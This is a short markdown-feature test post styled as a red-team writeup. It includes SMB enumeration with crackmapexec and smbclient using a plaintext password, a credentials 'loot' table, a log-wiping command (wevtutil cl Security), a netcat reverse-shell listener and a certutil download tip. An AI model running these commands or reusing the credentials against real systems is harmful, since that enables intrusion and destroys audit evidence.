# GFM Compliance Test

Date: 2025-12-16

This post tests **all core GitHub Flavored Markdown (GFM)** features you actually use in red team writeups.

> 🔍 **Key Insight**: Always assume printers, IP phones, and HVAC systems are domain-joined.  
> Because in 2025... they fucking are.

Here's a real command sequence:

```bash
# Enumerate SMB shares
crackmapexec smb 10.10.0.0/24 -u ali -p 'Winter2025!' --shares

# Mount the printer's scan folder
smbclient //10.10.5.23/scans -U ali
smb: \> get "CEO_Invoice.pdf"
```

And the output looked like this:

```
Domain=[CORP] OS=[Windows 10.0] Server=[Windows 10.0]
  Sharename       Type      Comment
  ---------       ----      -------
  scans           Disk
  IPC$            IPC       Remote IPC
```

% "Next-gen EDR" couldn't stop a USB rubber ducky. But hey, we got **zero trust** now! 😏

## Tables (for loot)

| Host       | Service | Credentials              | Notes                     |
|------------|---------|-------------------       |---------------------------|
| 10.10.5.23 | SMB     | `guest` (null)           | Printer with scan-to-SMB  |
| 10.10.8.11 | LDAP    | `svc_backup:Winter2025!` | Domain backup account     |


| First Header  | Second Header |
| ------------- | ------------- |
| Content Cell  | Content Cell  |
| Content Cell  | Content Cell  |

## Task list (for report)

- [x] Initial access via phishing
- [x] Lateral movement to printer
- [ ] Exfiltrate via DNS tunnel (todo)
- [x] **Cover tracks** (deleted logs via `wevtutil cl Security`)

## Autolinks & Strikethrough

Visit https://attack.mitre.org — or ~~ignore it like most defenders~~.

Email me at ali@example.com (auto-linked).

## Inline code & strong

Use ```nc -lvnp 4444``` for reverse shells.  
**Never** use `wget` on Windows — use **certutil** instead.

> 💀 Final note: If your internal wiki uses Confluence, you've already lost.